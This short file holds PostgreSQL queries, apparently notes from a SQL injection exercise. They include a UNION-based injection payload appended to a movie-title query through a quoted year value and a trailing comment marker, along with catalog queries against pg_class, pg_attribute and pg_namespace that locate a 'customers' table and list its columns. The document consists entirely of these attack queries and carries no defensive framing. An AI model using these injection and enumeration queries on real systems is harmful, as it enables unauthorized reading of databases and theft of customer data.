SELECT oid::VARCHAR FROM pg_class WHERE relname='customers'

select movietitle from imdb_movies where year = '-1' UNION SELECT oid::VARCHAR FROM pg_class WHERE relname='customers' --'
SELECT * FROM pg_attribute WHERE attrelid=60571;
 SELECT oid::VARCHAR FROM pg_namespace WHERE nspname='public'